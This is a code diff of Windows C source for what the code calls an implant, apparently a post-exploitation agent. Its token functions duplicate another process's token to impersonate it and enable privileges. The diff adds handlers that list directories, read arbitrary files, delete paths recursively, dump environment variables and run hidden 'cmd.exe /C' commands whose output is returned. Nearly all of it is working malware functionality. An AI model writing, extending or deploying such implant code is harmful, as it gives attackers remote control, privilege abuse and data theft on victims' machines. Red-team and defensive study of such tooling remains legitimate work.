@@ -5,20 +5,9 @@
 #define TOKEN_FIELD_FALSE 0U
 #define TOKEN_FIELD_TRUE 1U
 #define PRIVILEGE_NAME_BUFFER_SIZE 256
-/**
- * @brief Builds a TOKEN_SUMMARY response from an already-open token handle.
- *
- * The response contains a TOKEN_SUMMARY_HEADER followed by two UTF-16LE
- * strings: the account name and the SID string. Both strings include their
- * terminating null characters.
- *
- * @param tokenHandle The token to query.
- * @param impersonated Non-zero if the current security context is impersonated.
- * @param responseData Receives the heap-allocated response buffer.
- * @param responseLen Receives the response buffer length in bytes.
- *
- * @return A numeric error or success code.
- */
+#define LS_FLAG_DIRECTORY 1U
+#define LS_FLAG_FILE      0U
+
 static DWORD BuildTokenSummaryResponseFromToken(
 	HANDLE tokenHandle,
 	DWORD impersonated,
@@ -237,27 +226,22 @@ cleanup:
 	{
 		ImplantHeapFree(responseBuffer);
 	}
-
 	if (accountName != NULL)
 	{
 		ImplantHeapFree(accountName);
 	}
-
 	if (domainName != NULL)
 	{
 		ImplantHeapFree(domainName);
 	}
-
 	if (userName != NULL)
 	{
 		ImplantHeapFree(userName);
 	}
-
 	if (sidString != NULL)
 	{
 		LocalFree(sidString);
 	}
-
 	if (tokenUser != NULL)
 	{
 		ImplantHeapFree(tokenUser);
@@ -283,16 +267,16 @@ DWORD BuildCurrentTokenSummaryResponse(PBYTE* responseData, DWORD* responseLen)
 		*responseLen = 0;
 	}
 
-	if (!OpenProcessToken(GetCurrentProcess(), 
-		TOKEN_QUERY, 
+	if (!OpenProcessToken(GetCurrentProcess(),
+		TOKEN_QUERY,
 		&processToken))
 	{
 		return ERROR_OPEN_PROCESS_TOKEN_FAILED;
 	}
 
-	if (OpenThreadToken(GetCurrentThread(), 
-		TOKEN_QUERY, 
-		TRUE, 
+	if (OpenThreadToken(GetCurrentThread(),
+		TOKEN_QUERY,
+		TRUE,
 		&threadToken))
 	{
 		impersonated = TOKEN_FIELD_TRUE;
@@ -406,17 +390,14 @@ cleanup:
 	{
 		ImplantHeapFree(tokenSummary);
 	}
-
 	if (finalBuffer != NULL)
 	{
 		ImplantHeapFree(finalBuffer);
 	}
-
 	if (tokenHandle != NULL)
 	{
 		CloseHandle(tokenHandle);
 	}
-
 	if (processHandle != NULL)
 	{
 		CloseHandle(processHandle);
@@ -424,14 +405,13 @@ cleanup:
 
 	return status;
 }
-//I used GEmini to help me with this function
+
 DWORD BuildTokenPrivilegesResponse(
 	DWORD processId,
 	PBYTE* responseData,
 	DWORD* responseLen
 )
 {
-	UNREFERENCED_PARAMETER(processId);
 	DWORD status = NO_ERROR;
 	HANDLE processHandle = NULL;
 	HANDLE tokenHandle = NULL;
@@ -443,6 +423,7 @@ DWORD BuildTokenPrivilegesResponse(
 	DWORD offset = 0;
 	DWORD validCount = 0;
 	DWORD nameChars = 0;
+
 	ASSERT(responseData != NULL);
 	ASSERT(responseLen != NULL);
 
@@ -465,7 +446,6 @@ DWORD BuildTokenPrivilegesResponse(
 	if (returnLength == 0)
 	{
 		status = ERROR_GET_TOKEN_INFORMATION_FAILED;
-		if (status == NO_ERROR) status = ERROR_INVALID_REQUEST;
 		goto cleanup;
 	}
 
@@ -531,7 +511,10 @@ DWORD BuildTokenPrivilegesResponse(
 		{
 			DWORD nameBytes = nameChars * sizeof(WCHAR);
 
-			if (offset + sizeof(DWORD) + sizeof(DWORD) + nameBytes > finalLength) break;
+			if (offset + sizeof(DWORD) + sizeof(DWORD) + nameBytes > finalLength)
+			{
+				break;
+			}
 
 			*(DWORD*)(finalBuffer + offset) = tokenPrivileges->Privileges[i].Attributes;
 			offset += sizeof(DWORD);
@@ -553,7 +536,7 @@ cleanup:
 	{
 		ImplantHeapFree(tokenPrivileges);
 	}
-	if (finalBuffer != NULL) 
+	if (finalBuffer != NULL)
 	{
 		ImplantHeapFree(finalBuffer);
 	}
@@ -561,7 +544,7 @@ cleanup:
 	{
 		CloseHandle(tokenHandle);
 	}
-	if (processHandle != NULL) 
+	if (processHandle != NULL)
 	{
 		CloseHandle(processHandle);
 	}
@@ -570,17 +553,11 @@ cleanup:
 }
 
 DWORD ImpersonateProcessToken(
-	DWORD processId, 
-	PBYTE* responseData, 
+	DWORD processId,
+	PBYTE* responseData,
 	DWORD* responseLen
 )
 {
-	ASSERT(responseData != NULL);
-	ASSERT(responseLen != NULL);
-
-	*responseData = NULL;
-	*responseLen = 0;
-
 	DWORD status = NO_ERROR;
 	HANDLE processHandle = NULL;
 	HANDLE tokenHandle = NULL;
@@ -588,20 +565,26 @@ DWORD ImpersonateProcessToken(
 	PBYTE finalBuffer = NULL;
 	DWORD finalLength = 0;
 
+	ASSERT(responseData != NULL);
+	ASSERT(responseLen != NULL);
+
+	*responseData = NULL;
+	*responseLen = 0;
+
 	processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
 	if (processHandle == NULL)
 	{
 		return ERROR_OPEN_PROCESS_FAILED;
 	}
 
-	/* Need duplicate rights so we can create an impersonation token */
-	if (!OpenProcessToken(processHandle, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &tokenHandle))
+	if (!OpenProcessToken(processHandle,
+		TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
+		&tokenHandle))
 	{
 		status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
 		goto cleanup;
 	}
 
-	/* Duplicate to an impersonation token with SecurityImpersonation level */
 	if (!DuplicateTokenEx(
 		tokenHandle,
 		TOKEN_IMPERSONATE | TOKEN_QUERY,
@@ -625,7 +608,6 @@ DWORD ImpersonateProcessToken(
 	if (finalBuffer == NULL)
 	{
 		status = ERROR_MEMORY_ALLOCATION_FAILED;
-		/* If impersonation succeeded above, it remains in effect; caller may need to revert. */
 		goto cleanup;
 	}
 
@@ -641,17 +623,14 @@ cleanup:
 	{
 		ImplantHeapFree(finalBuffer);
 	}
-
 	if (impToken != NULL)
 	{
 		CloseHandle(impToken);
 	}
-
 	if (tokenHandle != NULL)
 	{
 		CloseHandle(tokenHandle);
 	}
-
 	if (processHandle != NULL)
 	{
 		CloseHandle(processHandle);
@@ -661,32 +640,33 @@ cleanup:
 }
 
 DWORD EnableCurrentTokenPrivilege(
-	PCWSTR privilegeName, 
-	PBYTE* responseData, 
-	DWORD* responseLen)
+	PCWSTR privilegeName,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
 {
-	UNREFERENCED_PARAMETER(privilegeName);
-	ASSERT(responseData != NULL);
-	ASSERT(responseLen != NULL);
-
-	*responseData = NULL;
-	*responseLen = 0;
-	//Steps: LookupPrivilegeValue to get the LUID for the privilege name, OpenProcessToken to get the current process token, AdjustTokenPrivileges to enable the privilege, and check for errors.
 	LUID luid = { 0 };
 	TOKEN_PRIVILEGES tp = { 0 };
 	DWORD status = NO_ERROR;
 	PBYTE finalBuffer = NULL;
 	DWORD finalLength = 0;
 	DWORD nameBytes = 0;
-	HANDLE processHandle = NULL;
 	HANDLE tokenHandle = NULL;
 
-	processHandle = GetCurrentProcess();
-	if (!OpenProcessToken(processHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
+	ASSERT(responseData != NULL);
+	ASSERT(responseLen != NULL);
+
+	*responseData = NULL;
+	*responseLen = 0;
+
+	if (!OpenProcessToken(
+		GetCurrentProcess(),
+		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+		&tokenHandle))
 	{
 		status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
 		goto cleanup;
-	}	
+	}
 
 	if (!LookupPrivilegeValueW(NULL, privilegeName, &luid))
 	{
@@ -694,17 +674,22 @@ DWORD EnableCurrentTokenPrivilege(
 		goto cleanup;
 	}
 
-	tp.PrivilegeCount = 1; // We are only enabling one privilege at a time
+	tp.PrivilegeCount = 1;
 	tp.Privileges[0].Luid = luid;
 	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-	if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
+	if (!AdjustTokenPrivileges(
+		tokenHandle,
+		FALSE,
+		&tp,
+		sizeof(TOKEN_PRIVILEGES),
+		NULL,
+		NULL))
 	{
 		status = ERROR_ADJUST_TOKEN_PRIVILEGES_FAILED;
 		goto cleanup;
 	}
 
-	/* Build response: [DWORD status][WCHAR privilegeName with null] */
 	nameBytes = (DWORD)((wcslen(privilegeName) + 1) * sizeof(WCHAR));
 	finalLength = sizeof(DWORD) + nameBytes;
 
@@ -727,10 +712,539 @@ cleanup:
 	{
 		CloseHandle(tokenHandle);
 	}
-
 	if (finalBuffer != NULL)
 	{
 		ImplantHeapFree(finalBuffer);
+	}
+
+	return status;
+}
+
+static BOOL BuildSearchPattern(PCWSTR path, PWSTR outBuf, SIZE_T outCount)
+{
+	if (FAILED(StringCchCopyW(outBuf, outCount, path)))
+	{
+		return FALSE;
+	}
+	if (FAILED(StringCchCatW(outBuf, outCount, L"\\*")))
+	{
+		return FALSE;
+	}
+	return TRUE;
+}
+
+static DWORD DeleteDirectoryRecursive(PCWSTR path)
+{
+	WCHAR searchPattern[MAX_PATH];
+	WIN32_FIND_DATAW findData;
+	HANDLE findHandle = INVALID_HANDLE_VALUE;
+	DWORD status = NO_ERROR;
+	WCHAR childPath[MAX_PATH];
+
+	if (!BuildSearchPattern(path, searchPattern, MAX_PATH))
+	{
+		return ERROR_FORMAT_ACCOUNT_NAME_FAILED;
+	}
+
+	findHandle = FindFirstFileW(searchPattern, &findData);
+	if (findHandle == INVALID_HANDLE_VALUE)
+	{
+		return ERROR_LIST_DIRECTORY_FAILED;
+	}
+
+	do
+	{
+		if (wcscmp(findData.cFileName, L".") == 0 ||
+			wcscmp(findData.cFileName, L"..") == 0)
+		{
+			continue;
+		}
+
+		if (FAILED(StringCchPrintfW(
+			childPath,
+			MAX_PATH,
+			L"%ls\\%ls",
+			path,
+			findData.cFileName)))
+		{
+			status = ERROR_FORMAT_ACCOUNT_NAME_FAILED;
+			break;
+		}
+
+		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+		{
+			status = DeleteDirectoryRecursive(childPath);
+		}
+		else
+		{
+			if (!DeleteFileW(childPath))
+			{
+				status = ERROR_DELETE_PATH_FAILED;
+			}
+		}
+
+		if (status != NO_ERROR)
+		{
+			break;
+		}
+	} while (FindNextFileW(findHandle, &findData));
+
+	FindClose(findHandle);
+
+	if (status != NO_ERROR)
+	{
+		return status;
+	}
+
+	if (!RemoveDirectoryW(path))
+	{
+		return ERROR_DELETE_PATH_FAILED;
+	}
+
+	return NO_ERROR;
+}
+
+DWORD ListDirectory(PCWSTR path, PBYTE* responseData, DWORD* responseLen)
+{
+	WCHAR searchPattern[MAX_PATH];
+	WIN32_FIND_DATAW findData;
+	HANDLE findHandle = INVALID_HANDLE_VALUE;
+	DWORD entryCount = 0;
+	DWORD bufferSize = 0;
+	DWORD offset = 0;
+	PBYTE buffer = NULL;
+
+	ASSERT(responseData != NULL);
+	ASSERT(responseLen != NULL);
+
+	*responseData = NULL;
+	*responseLen = 0;
+
+	if (!BuildSearchPattern(path, searchPattern, MAX_PATH))
+	{
+		return ERROR_FORMAT_ACCOUNT_NAME_FAILED;
+	}
+
+	findHandle = FindFirstFileW(searchPattern, &findData);
+	if (findHandle == INVALID_HANDLE_VALUE)
+	{
+		return ERROR_LIST_DIRECTORY_FAILED;
+	}
+
+	bufferSize = sizeof(DWORD);
+
+	do
+	{
+		if (wcscmp(findData.cFileName, L".") == 0 ||
+			wcscmp(findData.cFileName, L"..") == 0)
+		{
+			continue;
+		}
+
+		DWORD nameBytes =
+			((DWORD)wcslen(findData.cFileName) + 1) * sizeof(WCHAR);
+
+		bufferSize += sizeof(DWORD) + sizeof(ULONGLONG) +
+			sizeof(DWORD) + nameBytes;
+		entryCount++;
+	} while (FindNextFileW(findHandle, &findData));
+
+	FindClose(findHandle);
+	findHandle = INVALID_HANDLE_VALUE;
+
+	buffer = (PBYTE)ImplantHeapAlloc(bufferSize);
+	if (buffer == NULL)
+	{
+		return ERROR_MEMORY_ALLOCATION_FAILED;
+	}
+
+	*(DWORD*)(buffer + offset) = entryCount;
+	offset += sizeof(DWORD);
+
+	findHandle = FindFirstFileW(searchPattern, &findData);
+	if (findHandle == INVALID_HANDLE_VALUE)
+	{
+		ImplantHeapFree(buffer);
+		return ERROR_LIST_DIRECTORY_FAILED;
+	}
+
+	do
+	{
+		if (wcscmp(findData.cFileName, L".") == 0 ||
+			wcscmp(findData.cFileName, L"..") == 0)
+		{
+			continue;
+		}
+
+		DWORD flags = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+			? LS_FLAG_DIRECTORY : LS_FLAG_FILE;
+
+		ULONGLONG fileSize =
+			((ULONGLONG)findData.nFileSizeHigh << 32) |
+			(ULONGLONG)findData.nFileSizeLow;
+
+		DWORD nameBytes =
+			((DWORD)wcslen(findData.cFileName) + 1) * sizeof(WCHAR);
+
+		*(DWORD*)(buffer + offset) = flags;
+		offset += sizeof(DWORD);
+
+		*(ULONGLONG*)(buffer + offset) = fileSize;
+		offset += sizeof(ULONGLONG);
+
+		*(DWORD*)(buffer + offset) = nameBytes;
+		offset += sizeof(DWORD);
+
+		CopyMemory(buffer + offset, findData.cFileName, nameBytes);
+		offset += nameBytes;
+	} while (FindNextFileW(findHandle, &findData));
+
+	FindClose(findHandle);
+
+	*responseData = buffer;
+	*responseLen = offset;
+	return NO_ERROR;
+}
+
+DWORD ReadFileContents(PCWSTR path, PBYTE* responseData, DWORD* responseLen)
+{
+	HANDLE fileHandle = INVALID_HANDLE_VALUE;
+	DWORD fileSize = 0;
+	DWORD bytesRead = 0;
+	PBYTE buffer = NULL;
+	DWORD status = NO_ERROR;
+	DWORD totalLength = 0;
+
+	ASSERT(responseData != NULL);
+	ASSERT(responseLen != NULL);
+
+	*responseData = NULL;
+	*responseLen = 0;
+
+	fileHandle = CreateFileW(
+		path,
+		GENERIC_READ,
+		FILE_SHARE_READ,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL
+	);
+
+	if (fileHandle == INVALID_HANDLE_VALUE)
+	{
+		return ERROR_OPEN_FILE_FAILED;
+	}
+
+	fileSize = GetFileSize(fileHandle, NULL);
+	if (fileSize == INVALID_FILE_SIZE)
+	{
+		status = ERROR_READ_FILE_FAILED;
+		goto cleanup;
+	}
+
+	totalLength = sizeof(DWORD) + fileSize;
+	buffer = (PBYTE)ImplantHeapAlloc(totalLength);
+	if (buffer == NULL)
+	{
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	*(DWORD*)buffer = fileSize;
+
+	if (fileSize > 0)
+	{
+		if (!ReadFile(
+			fileHandle,
+			buffer + sizeof(DWORD),
+			fileSize,
+			&bytesRead,
+			NULL) || bytesRead != fileSize)
+		{
+			ImplantHeapFree(buffer);
+			buffer = NULL;
+			status = ERROR_READ_FILE_FAILED;
+			goto cleanup;
+		}
+	}
+
+	*responseData = buffer;
+	*responseLen = totalLength;
+	buffer = NULL;
+
+cleanup:
+	if (fileHandle != INVALID_HANDLE_VALUE)
+	{
+		CloseHandle(fileHandle);
+	}
+
+	return status;
+}
+
+DWORD CreateDirectory_(PCWSTR path)
+{
+	if (!CreateDirectoryW(path, NULL))
+	{
+		DWORD err = GetLastError();
+		if (err == ERROR_ALREADY_EXISTS)
+		{
+			return ERROR_DIRECTORY_ALREADY_EXISTS;
+		}
+		return ERROR_CREATE_DIRECTORY_FAILED;
+	}
+	return NO_ERROR;
+}
+
+DWORD DeletePath(PCWSTR path)
+{
+	DWORD attributes = GetFileAttributesW(path);
+	if (attributes == INVALID_FILE_ATTRIBUTES)
+	{
+		return ERROR_DELETE_PATH_FAILED;
+	}
+
+	if (attributes & FILE_ATTRIBUTE_DIRECTORY)
+	{
+		return DeleteDirectoryRecursive(path);
+	}
+
+	if (!DeleteFileW(path))
+	{
+		return ERROR_DELETE_PATH_FAILED;
+	}
+
+	return NO_ERROR;
+}
+
+DWORD BuildCurrentUserResponse(PBYTE* responseData, DWORD* responseLen)
+{
+	if (responseData == NULL || responseLen == NULL)
+	{
+		return ERROR_INVALID_REQUEST;
+	}
+
+	return BuildCurrentTokenSummaryResponse(responseData, responseLen);
+}
+
+DWORD GetEnvironmentBlock(PBYTE* responseData, DWORD* responseLen)
+{
+	LPWCH envBlock = NULL;
+	LPWCH cursor = NULL;
+	DWORD count = 0;
+	DWORD bufferSize = sizeof(DWORD);
+	PBYTE buffer = NULL;
+	DWORD offset = 0;
+
+	ASSERT(responseData != NULL);
+	ASSERT(responseLen != NULL);
+
+	*responseData = NULL;
+	*responseLen = 0;
+
+	envBlock = GetEnvironmentStringsW();
+	if (envBlock == NULL)
+	{
+		return ERROR_GET_ENV_FAILED;
+	}
+
+	cursor = envBlock;
+	while (*cursor != L'\0')
+	{
+		LPWCH eq = wcschr(cursor, L'=');
+		if (eq != NULL && eq != cursor)
+		{
+			DWORD nameBytes = (DWORD)((eq - cursor) + 1) * sizeof(WCHAR);
+			DWORD valueBytes = (DWORD)(wcslen(eq + 1) + 1) * sizeof(WCHAR);
+			bufferSize += sizeof(DWORD) + nameBytes + sizeof(DWORD) + valueBytes;
+			count++;
+		}
+		cursor += wcslen(cursor) + 1;
+	}
+
+	buffer = (PBYTE)ImplantHeapAlloc(bufferSize);
+	if (buffer == NULL)
+	{
+		FreeEnvironmentStringsW(envBlock);
+		return ERROR_MEMORY_ALLOCATION_FAILED;
+	}
+
+	*(DWORD*)(buffer + offset) = count;
+	offset += sizeof(DWORD);
+
+	cursor = envBlock;
+	while (*cursor != L'\0')
+	{
+		LPWCH eq = wcschr(cursor, L'=');
+		if (eq != NULL && eq != cursor)
+		{
+			DWORD nameChars = (DWORD)(eq - cursor);
+			DWORD nameBytes = (nameChars + 1) * sizeof(WCHAR);
+			DWORD valueBytes = (DWORD)(wcslen(eq + 1) + 1) * sizeof(WCHAR);
+
+			*(DWORD*)(buffer + offset) = nameBytes;
+			offset += sizeof(DWORD);
+			CopyMemory(buffer + offset, cursor, nameChars * sizeof(WCHAR));
+			offset += nameChars * sizeof(WCHAR);
+			*(WCHAR*)(buffer + offset) = L'\0';
+			offset += sizeof(WCHAR);
+
+			*(DWORD*)(buffer + offset) = valueBytes;
+			offset += sizeof(DWORD);
+			CopyMemory(buffer + offset, eq + 1, valueBytes);
+			offset += valueBytes;
+		}
+		cursor += wcslen(cursor) + 1;
+	}
+
+	FreeEnvironmentStringsW(envBlock);
+
+	*responseData = buffer;
+	*responseLen = offset;
+	return NO_ERROR;
+}
+
+DWORD ExecCommand(PCWSTR cmdLine, PBYTE* responseData, DWORD* responseLen)
+{
+	DWORD status = NO_ERROR;
+	HANDLE hReadPipe = NULL;
+	HANDLE hWritePipe = NULL;
+	SECURITY_ATTRIBUTES sa = { 0 };
+	STARTUPINFOW si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+	WCHAR fullCmd[32768];
+	PBYTE outputBuf = NULL;
+	DWORD outputCapacity = 65536;
+	DWORD outputUsed = 0;
+	DWORD bytesRead = 0;
+	BYTE readChunk[4096];
+	DWORD exitCode = 0;
+	PBYTE finalBuffer = NULL;
+	DWORD finalLength = 0;
+
+	ASSERT(responseData != NULL);
+	ASSERT(responseLen != NULL);
+
+	*responseData = NULL;
+	*responseLen = 0;
+
+	sa.nLength = sizeof(sa);
+	sa.bInheritHandle = TRUE;
+	sa.lpSecurityDescriptor = NULL;
+
+	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
+	{
+		return ERROR_EXEC_FAILED;
+	}
+
+	if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0))
+	{
+		status = ERROR_EXEC_FAILED;
+		goto cleanup;
+	}
+
+	if (FAILED(StringCchPrintfW(fullCmd, ARRAYSIZE(fullCmd), L"cmd.exe /C %ls", cmdLine)))
+	{
+		status = ERROR_EXEC_FAILED;
+		goto cleanup;
+	}
+
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESTDHANDLES;
+	si.hStdOutput = hWritePipe;
+	si.hStdError = hWritePipe;
+	si.hStdInput = NULL;
+
+	if (!CreateProcessW(
+		NULL,
+		fullCmd,
+		NULL,
+		NULL,
+		TRUE,
+		CREATE_NO_WINDOW,
+		NULL,
+		NULL,
+		&si,
+		&pi
+	))
+	{
+		status = ERROR_EXEC_FAILED;
+		goto cleanup;
+	}
+
+	CloseHandle(hWritePipe);
+	hWritePipe = NULL;
+
+	outputBuf = (PBYTE)ImplantHeapAlloc(outputCapacity);
+	if (outputBuf == NULL)
+	{
+		TerminateProcess(pi.hProcess, 1);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	while (ReadFile(hReadPipe, readChunk, sizeof(readChunk), &bytesRead, NULL) &&
+		bytesRead > 0)
+	{
+		if (outputUsed + bytesRead > outputCapacity)
+		{
+			DWORD newCap = outputCapacity * 2;
+			PBYTE newBuf = (PBYTE)ImplantHeapAlloc(newCap);
+			if (newBuf == NULL)
+			{
+				break;
+			}
+			CopyMemory(newBuf, outputBuf, outputUsed);
+			ImplantHeapFree(outputBuf);
+			outputBuf = newBuf;
+			outputCapacity = newCap;
+		}
+		CopyMemory(outputBuf + outputUsed, readChunk, bytesRead);
+		outputUsed += bytesRead;
+	}
+
+	WaitForSingleObject(pi.hProcess, INFINITE);
+	GetExitCodeProcess(pi.hProcess, &exitCode);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+
+	finalLength = sizeof(DWORD) + sizeof(DWORD) + outputUsed;
+	finalBuffer = (PBYTE)ImplantHeapAlloc(finalLength);
+	if (finalBuffer == NULL)
+	{
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	*(DWORD*)finalBuffer = exitCode;
+	*(DWORD*)(finalBuffer + sizeof(DWORD)) = outputUsed;
+	if (outputUsed > 0)
+	{
+		CopyMemory(finalBuffer + sizeof(DWORD) + sizeof(DWORD), outputBuf, outputUsed);
+	}
+
+	*responseData = finalBuffer;
+	*responseLen = finalLength;
+	finalBuffer = NULL;
+
+cleanup:
+	if (outputBuf != NULL)
+	{
+		ImplantHeapFree(outputBuf);
+	}
+	if (finalBuffer != NULL)
+	{
+		ImplantHeapFree(finalBuffer);
+	}
+	if (hWritePipe != NULL)
+	{
+		CloseHandle(hWritePipe);
+	}
+	if (hReadPipe != NULL)
+	{
+		CloseHandle(hReadPipe);
 	}
 
 	return status;
